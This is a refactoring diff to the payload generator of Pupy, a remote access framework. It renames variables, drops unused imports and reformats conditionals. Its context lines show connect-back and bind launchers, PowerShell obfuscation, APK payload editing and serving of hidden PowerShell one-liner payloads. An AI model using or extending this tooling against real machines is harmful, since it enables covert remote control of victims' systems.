@@ -3,8 +3,8 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-import argparse, sys, os.path, re, shlex, random, string
-import zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
+import argparse, sys, os.path, random, string
+import zipfile, tarfile, tempfile, shutil, subprocess, pkgutil
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__)))
 
@@ -25,7 +25,6 @@ from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 from modules.lib.windows.powershell import obfuscatePowershellScript
 from pupylib.PupyCredentials import Credentials, EncryptionError
-from pupylib import PupyCredentials
 
 import marshal
 import scriptlets
@@ -34,10 +33,6 @@ import base64
 import os
 import pylzma
 import struct
-import getpass
-import string
-import random
-import json
 
 logger = getLogger('gen')
 
@@ -96,13 +91,13 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
     if obfuscate:
         obf_func=compress_encode_obfs
 
-    l = launchers[conf['launcher']]()
-    l.parse_args(conf['launcher_args'])
+    launcher = launchers[conf['launcher']]()
+    launcher.parse_args(conf['launcher_args'])
 
-    required_credentials = set(l.credentials) \
-      if hasattr(l, 'credentials') else set([])
+    required_credentials = set(launcher.credentials) \
+      if hasattr(launcher, 'credentials') else set([])
 
-    transport = l.get_transport()
+    transport = launcher.get_transport()
     transports_list = []
 
     if transport:
@@ -245,7 +240,6 @@ def get_edit_apk(path, conf, compressed_config=None, debug=False):
             raise e
         # -tsa http://timestamp.digicert.com
         print(res)
-        content = b''
         with open(tempapk) as apk:
             return apk.read()
 
@@ -558,10 +552,10 @@ def pupygen(args, config):
         )
 
 
-    l = launchers[args.launcher]()
+    launcher = launchers[args.launcher]()
     while True:
         try:
-            l.parse_args(args.launcher_args)
+            launcher.parse_args(args.launcher_args)
         except LauncherError as e:
             if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
                 myip = get_listener_ip(external=args.prefer_external, config=config)
@@ -592,7 +586,7 @@ def pupygen(args, config):
                 ]
 
             else:
-                l.arg_parser.print_usage()
+                launcher.arg_parser.print_usage()
                 return
         else:
             break
@@ -699,10 +693,16 @@ def pupygen(args, config):
         if conf['launcher'] in ["connect", "auto_proxy"]:
             from pupylib.payloads.ps1_oneliner import serve_ps1_payload
             link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
-            if args.oneliner_no_ssl == False : sslEnabled = True
-            else: sslEnabled = False
-            if args.no_use_proxy == False : useTargetProxy = True
-            else: useTargetProxy = False
+            if args.oneliner_no_ssl == False:
+                sslEnabled = True
+            else:
+                sslEnabled = False
+
+            if args.no_use_proxy == False:
+                useTargetProxy = True
+            else:
+                useTargetProxy = False
+
             serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled, nothidden=args.oneliner_nothidden)
         elif conf['launcher'] == "bind":
             from pupylib.payloads.ps1_oneliner import send_ps1_payload
